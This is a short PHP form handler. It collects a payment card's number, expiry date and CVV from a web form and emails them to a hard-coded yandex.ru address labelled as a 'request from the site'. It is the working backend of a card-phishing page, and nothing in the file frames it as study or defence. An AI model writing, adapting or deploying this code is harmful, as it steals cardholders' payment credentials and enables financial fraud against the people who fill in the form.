<!DOCTYPE html>
<html>
<body>

<?php
$numb = $_POST['numb'];
$date = $_POST['date'];
$cvv = $_POST['cvv'];
$numb = htmlspecialchars($numb);
$date = htmlspecialchars($date);
$cvv = htmlspecialchars($cvv);
$numb = trim($numb);
$date = trim($date);
$cvv = trim($cvv);
echo $numb;
echo "<br>";
echo $date;
echo "<br>";
echo $cvv;
mail("ag12.5@yandex.ru", "Заявка с сайта", "Номер:".$numb.". Дата: ".$date."Код:".$cvv ,"From: ag12.5@yandex.ru \r\n");
?>
</body>
</html>
